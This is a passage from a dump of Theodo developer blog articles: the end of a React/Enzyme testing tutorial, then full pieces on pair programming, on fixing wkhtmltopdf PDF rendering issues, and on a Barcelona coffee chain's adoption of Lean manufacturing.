'react';\r\nimport _ from 'lodash';\r\nimport ColoredRectangleComponent from './enzyme';\r\n\r\nclass Parent extends Component {\r\n  constructor(props) {\r\n    super(props);\r\n    this.state = {\r\n      squareList: [\r\n        {\r\n          text: 'number 1',\r\n          checked: true,\r\n          elementClass: 'red',\r\n        },\r\n        {\r\n          text: 'number 2',\r\n          checked: false,\r\n          elementClass: 'blue',\r\n        },\r\n      ],\r\n    };\r\n  }\r\n\r\n  componentDidMount() {}\r\n\r\n  render() {\r\n    return (\r\n      <div >\r\n        {_.map(this.state.squareList, (square, index) => {\r\n          return (\r\n            <ColoredRectangleComponent\r\n              key={index}\r\n              checked={square.checked}\r\n              elementClass={square.elementClass}\r\n              text={square.text}\r\n              onCheckboxChange={() => { return null; }}\r\n            />\r\n          );\r\n        })}\r\n      </div>\r\n    );\r\n  }\r\n}\r\n\r\nexport default Parent;\r\n\nAgain we\u2019ll have a look into two simple test cases; checking if the component does mount and whether or not it renders components correctly according to its state. We are expecting 2 ColoredRectangle components with the correct css classes attributed to them.\nimport React from 'react';\r\nimport { expect } from 'chai';\r\nimport { mount } from 'enzyme';\r\nimport sinon from 'sinon';\r\n\r\nimport Parent from './parent';\r\nimport ColoredRectangleComponent from './enzyme';\r\n\r\n\r\ndescribe('tests for <Parent> container', () => {\r\n  it('should test that the component mounts', () => {\r\n    sinon.spy(Parent.prototype, 'componentDidMount');\r\n    const container = mount(<Parent />);\r\n    expect(Parent.prototype.componentDidMount.calledOnce).to.equal(true);\r\n  });\r\n\r\n  it('should render 2 squares with the correct classes', () => {\r\n    const container = mount(<Parent />);\r\n    const expectedClassNamesList = ['red', 'blue'];\r\n\r\n    expect(container.find(ColoredRectangleComponent).length).to.equal(2);\r\n    container.find('div').forEach((node, index) => {\r\n      expect(node.hasClass(expectedClassNamesList[index])).to.equal(true);\r\n    });\r\n  });\r\n});\r\n\nConclusion\nThe tools provided by enzyme make testing React applications easy with a minimal setup cost. The documentation  is simple and well illustrated with many examples and different tips. Finally, if you need to debug a component, Enzyme also integrates a debug tool that quite simply prints the rendered element to the console as JSX. Just use console.log(container.debug()). Happy testing !\nUseful links :\n\nEnzyme docs\nJest docs\nChai enzyme\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAmbroise Laurent\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Thedo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\u00a0\nWhat is pair programming?\nPair programming is when two developers work on the same task on a single machine in a specific way: in pair programming (or \u201cpairing\u201d), the two devs must swap between two roles:\n\none at the keyboard, physically writing the code\nthe other not at the keyboard, suggesting ideas and catching errors\n\nThe roles must be swapped on a timer, for example 5 minutes or 3 minutes, which you can set with a phone alarm or an application on the computer.\nThere are many situations in a sprint when pair programming is really useful.\nRead on to find out how and when you can use it!\nAdvantages\nErrors can be caught faster when you have two people looking at the code.\nTwo coders working together in this way will come up with ideas and potential solutions much faster.\nIt\u2019s like instant code review.\nThe experience of the two developers is combined meaning better architectural decisions are taken.\nThe alternating timeboxes mean that a developer can\u2019t get stuck with a problem for long periods with no new ideas.\nNo-one loses focus on the work, and both developers keep contributing.\nDisadvantages\nSince pair programming requires full focus, the two devs should ensure they take regular breaks.\nSo when should you use it?\nConceptually complex tasks\nPair programming can really improve your performance on conceptually complex tickets, because these are the ones where the number of details is so large that a single developer would be significantly slowed down and have a higher probability of making mistakes.\nHaving another developer on hand reduces these problems.\nFor example, when integrating a new payment provider with a backend server and a frontend app, the number of details is immense and could be ameliorated by pairing.\nSpeeding up important tasks (e.g. the sprint goal)\nIn order to prioritise the sprint goal, when the sprint backlog is empty but there are still sprint-goal-related tickets in doing, developers should pair on the sprint goal tickets rather than taking tickets from the product backlog.\nThis brings the full development power of two devs to bear on the most critical work in the sprint.\nThe exception to this is if a single dev is particularly well-placed to do the tickets and would be slowed down by pairing \u2013 in that case, that dev should tackle the sprint goal.\nTraining\nPair programming is extremely useful for onboarding new developers \u2013 whether new to Theodo or new to a team.\nA more experienced developer can pair with a trainee to quickly and effectively share knowledge of the project and general coding skills.\nPairing helps the trainee stay engaged and ensures they write code themselves, instead of leaving the work to the experienced developer.\nWhen pairing for training, it is particularly important to respect the timer.\nA good balance is for the trainee to pair in the morning and tackle tickets on their own in the afternoon.\nHelp\nWhen a developer needs help with a specific issue, they can ask another developer \u2013 for example their coach, the architect on the project or any developer who knows about the issue, or indeed any developer \u2013 to pair with them.\nKnowledge can then be shared fluently.\nEven pairing with a developer with no specific experience in the project can be useful as they may catch errors you have missed, or bring fresh ideas.\nBottlenecks\nWhen there are more developers available than tickets available (e.g. in the case of dependency chains, or blocked tickets), pairing can allow the full power of multiple developers to be focused on the available tickets.\nKnowledge-sharing\nPairing is great for the express purpose of sharing knowledge of a new feature \u2013 a developer working the sole ticket implementing new functionality can ask another developer to pair so that the second developer also learns the additional information that is being introduced to the project.\nThis is important to maintain a cross-functional team, which is necessary for a scrum dev team.\nInterviewing\nPair programming is a revealing way to gain an insight into candidates interviewing for the role of developer.\nWhen you pair with someone, you can assess their knowledge firsthand, see how they react to new knowledge, and experience their style of communication and coding.\nConclusion\nPair programming is a great solution whenever you need to do a complex ticket, speed up an important ticket, train a new dev, help or be helped by another dev on a technical issue, get past a dependency bottleneck in a sprint, share knowledge in the dev team, or conduct a technical interview.\nSince these situations arise in every project, and potentially in every sprint (e.g. the sprint goal will always be an important task worth prioritising), you should pair whenever possible in these situations.\nPairing helps everyone in the team get to know each other, builds team spirit, and makes working together on the same task more engaging!\nIt would be great to hear from you \u2013 post any interesting experiences or use-cases of pair programming in the comments below!\n\u00a0\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFarhan Mannan\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIn the previous article, we saw how to use wkhtmltopdf.\u00a0But, when I did it, I encountered problems that I really want to share with you.\nEach problem has a solution\nFirst, you have to understand what wkhtmltopdf does: rendering the html with \u2018its own browser\u2018. So, when something does not seem to work, try:\n\nTo add an option to wkhtmltopdf\u2019s browser configuration\nModify the html you gave to wkhtmltopdf\u2019s browser\n\nNow, we can improve the rendering of our pdf!\nHow to handle the dimensions of the pdf\n\nFirst, we need to define these two new functions:\n// controller.js\r\n\r\n// Return the width and the height of the document\r\n// In the way the user see it\r\ngetSize = function(html) {\r\n  return {\r\n    width: html.offsetWidth,\r\n    height: html.offsetHeight,\r\n  }\r\n}\r\n\r\n// Return the real full height of the document\r\n// With no scroll\r\ngetRealHeight = function(html) {\r\n  clone = angular.copy(html)\r\n  clone.style.height = 'auto'\r\n  realHeight = clone.offsetHeight\r\n\r\n  return realHeight\r\n}\r\n\nAnd give these two new values to our back-end\n// controller.js\r\n\r\n$scope.print = function() {\r\n  var html = document.getElementsByTagName('html')[0];\r\n  var body = {\r\n    html: html,\r\n    size: getSize(html),\r\n    realHeight: getRealHeight(html),\r\n  };\r\n\r\n  $http.post('api/pdf/print', body, {responseType: 'arraybuffer'})\r\n  .success(function(response) {\r\n    var file = new Blob([ response ], {type: 'application/pdf'});\r\n    FileSaver.saveAs(file, 'print.pdf');\r\n  })\r\n}\r\n\nIn the back-end you just have to set the following options\n\nviewport-size is used to emulate the window size\npage-width and page-height are used to set the pdf size\n\n// pdf.js\r\n  var size = req.body.size\r\n  var realHeight = req.body.realHeight\r\n\r\n  var options = {\r\n    'viewport-size': size.width + 'x' + size.height,\r\n    // I found a 0.271 ratio\r\n    'page-width': (size.width * 0.271),\r\n    'page-height': (realHeight * 0.271),\r\n    'user-style-sheet': CSSLocation,\r\n  }\r\n\nThis way you have exactly what you see on your navigator!\nNota Bene: the page-width and page-height values were given in mm,\u00a0so I thought I should have a 0.264583333 ratio from pixel to mm. But when I tried, I found 0.271 as a better approximation. (This was useful on my project because of SVG with inline dimensions)\n\n\u00a0How to display the images correctly\nYou need to know one thing: wkhtmltopdf needs absolute paths for images.\u00a0In my project, I used this fix:\n// pdf.js\r\n\r\n// Replace relativ path of img by absolute path\r\nhtml = html.replace(/static\\/images\\//g, projectLocation + 'client/www/static/images/')\r\n\nBut you have to change the regex /static\\/images\\//g\u00a0and the path client/www/static/images/ according to where the images are stored.\nHow to modify the pdf before printing it\nIf you understand how wkhtmltopdf works, this hint won\u2019t surprise you: modify the html you send!\n// controller.js\r\n  var body = {\r\n    html: getModifiedHtml(html),\r\n    size: getSize(html),\r\n    realHeight: getRealHeight(html),\r\n  };\r\n\nNow you can do what you want with your pdf:\n// controller.js\r\ngetModifiedHtml = function(html) {\r\n  newHtml = angular.copy(html)\r\n  newHtml = removeHeader(newHtml)\r\n  newHtml = removeFooter(newHtml)\r\n  newHtml = addNewHeader(newHtml)\r\n  newHtml = addNewFooter(newHtml)\r\n  newHtml = doStuff(newHtml)\r\n  // ...\r\n  return newHtml\r\n}\r\n\nBut the first line newHtml = angular.copy(html) is really important.\nDo not forget to start by copying the html you got before modifying it.\nOtherwise, your user will be surprised\u2026\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tVincent Langlet\r\n  \t\t\t\r\n  \t\t\t\tVincent Langlet is an agile web developer at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\n\u00a0How a Spanish Coffee Chain started to go\u00a0Lean\n\n\nThis article wants to be a friendly and concrete introduction to Lean. If you have only heard of the concept, I hope you get a clearer view of what Lean is. If you\u2019re an expert, I hope it provides you with additional facts for you to spread the word about this incredible philosophy. In any case, I left out the most theoretical aspects of Lean to provide a pragmatic case, so there\u2019s plenty more to be learned! And now, lets hop to our tale, shall we?\n\n\n\n\n\n\nPain and\u00a0reaction\nEmi and Juan Antonio Tena, wife and husband, founded 365 in 1999. 365 is a Coffee Chain set in Barcelona. The founders were born in service. In their childhood they waited tables, served coffee, and helped in the kitchen. 365 had 3 caf\u00e9s opened in 2003, 9 in 2005, and in 2009, there were 33 of them. Contrary to what their growth suggests, things didn\u2019t go smoothly. The staff was angry. The quality was poor. They were disorganized. As a result, customer satisfaction was low. 365 is a mix between a caf\u00e9 and a bakery: they sell sandwiches and pastries that you can eat in the shop. Baguettes and pastries are produced in a single bakery, and are then transported to the shops. Since they were still growing in 2009, the founders planned on buying a whole new building to increase their production and storage space. At this point, by chance, Juan Antonio came across the book Lean thinking.\nThe book theorizes Lean manufacturing, which is one of the many efforts of extending what Toyota had been doing successfully since the 1950s. Keep in mind that Toyota\u2019s challenge was to manufacture cars fast in a post-war Japan, where resources were rare and expensive. Yet, Japan became a huge economic power in thirty years, and Toyota became one of the main car manufacturers. Lean, at its core, aims at producing goods one by one, as fast as possible, and with no waste. Imagine the perfect Lean system as a production line where your product is being built without defects by karate masters. Lean is hard to explain because reducing waste is achieved through desperately simple steps. Bear in mind that Lean is hard because it involves change, it involves breaking the \u201cit\u2019s always been done that way\u201d state of mind, and it involved breaking it several times every single day. So how did Emi and Juan Antonio onboard their employees, whose preoccupations were doing their day-to-day work? They started by telling their bakers to go home two hours earlier for three weeks.\n\n\n\n\n\n\nLowering the surface of the sea to see the\u00a0rocks\nFirst, let me reassure you: the bakers were still getting their full wage, even though they were working less. The fridges got empty in three weeks, as the bakers were producing less than what was needed for each day. And that was precisely the goal of this risky maneuver. See, those storage spaces were very costly, and they wasted time. Picture yourself picking frozen baguettes in a very large fridge, trying to find the freshest ones at the back, which you can barely see. You could argue that it\u2019s a matter of organization, yet the bigger the storage, the harder it is to actually visualize what\u2019s in it, and the more you get constrained by how your facility is designed. At first, the bakers thought the founders had gone crazy. Little by little, the fridges\u2019 contents decreased and they eventually got rid of the freezer. The expensive building they considered buying? They did not need it any more. The quality of the bread? Without freezing, it increased dramatically.\nThis is not a fairy tale though. Emi and Juan Antonio did not snap their fingers, made the fridges disappear, and suddenly everyone got happy. Here\u2019s why. A baguette gets significantly less fresh after one day. We have a single bakery, without much storage space for the baguettes. You then have to bring them more often to the shops which means you get more heavily impacted by problems in the production process. And this is where it gets interesting! Remember the situation\u00a0: you are an unhappy worker who has to produce a lot. Suddenly, your stressed boss Juan Antonio tells you that you have to go home earlier every day until the fridges to became empty. When they did, every problem, like a broken oven or overcooked baguettes, could no longer be solved thanks to your stock, and so they hurt more than before. Wouldn\u2019t you have asked for the old system to be brought back? This is where the founders had to be smart.\nLean is a just-in-time manufacturing process, meaning that ideally you would produce baguettes, or cars, one by one. Just-in-time is also a hallmark of Fordism, a system that has been rightfully criticized for the big strain it put on workers. Lean, and Toyota, use just-in-time to show the problems in the manufacturing process, and give the workers the ability to stop the production chain if they spot a problem, and give them tools to solve them. You can see it as lowering the surface of the sea to see the rocks. Emi and Juan Antonio hired Lean coaches to help the bakers solve the day-to-day production issues, they encouraged the employees to take Lean classes, and went to Lean workshops. In other words, if your production chain was a water hose, using just-in-time would be adding pressure to the water travelling inside it to find the holes.\n\n\n\n\n\n\nEmbracing the\u00a0problems\nIt\u2019s impossible to go into the details of the countless specific problems 365 employees solve every day, so I\u2019ll relate one. Leonor \u00ab\u00a0Leo\u00a0\u00bb Tena, daughter of the founders, who also works at 365, kindly told me about it during a video call. Strangely, she kept excusing herself for her Spanish accent when I had no trouble understanding her at all, and I thought my accent was far worse. \u00ab\u00a0In the factory they have different sections. One of them takes the bread from the fermentadora and puts it in the oven. At this step the size was a frequent problem\u00a0\u00bb she explains. As a result, the baguettes coming out of the oven tiny and dry. Why? This was because the fermentation was going wrong. Why? Because the bread had to have a specific size to be put in the fermentation room aka the fermentadora. Eventually one of the bakers got fed up with the defect. \u00ab\u00a0At first the baker used a cardboard that he cut as a guide to check the size of the baguette. The manager said it\u2019s a good idea and they made a metal one. Now it\u2019s even used for other things as the bread\u00a0\u00bb, Leo told me.\nIt does not seem like much, but remember that they solve these kinds of problems every day. If they did not have Lean, they would have maybe went on with the problem, because since they had stock a few baguettes gone wrong did not have a big impact. The manager could also have spotted the problem and engineered a complicated solution. Because the baker was working close to the problem, he was able to find a simple and pragmatic solution. His manager helped him in making it a standardized one. This type of solution is called an andon in Lean, and here it takes the form of a simple quality check.\nEventually, after months of efforts, people felt like Lean really worked. \u00ab\u00a0They were doing les movement, producing the double. The saw the results; it\u2019s easy to see the results: they used less hours to produce the same things. In the end, you agree with the methods\u00a0\u00bb, summed up Leo.\nLean is now applied everywhere in 365, from the providers, to the workshop, the shops, accounting, or human resources. This article has been fueled by a presentation and a visit of 365 during the Barcelona Lean Summit, which I attended with my fellow Theodoers. There is a lot more to write about 365 and Lean, so do feel free to express your interest in another article like this one!\nTo go further:\n\nthis article from Planet Lean is an interesting analysis of 365\na summary of Lean Thinking\nan article on minimizing inventory\n\u201cit\u2019s always been done that way\u201d and the Five Monkeys fable\n\nThis article has been cross-posted to my Medium page.\n\n\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFlavian Hautbois\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo. Musician, entrepreneur, fanatic of innovation, science, and technology. Failed one startup so far.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"}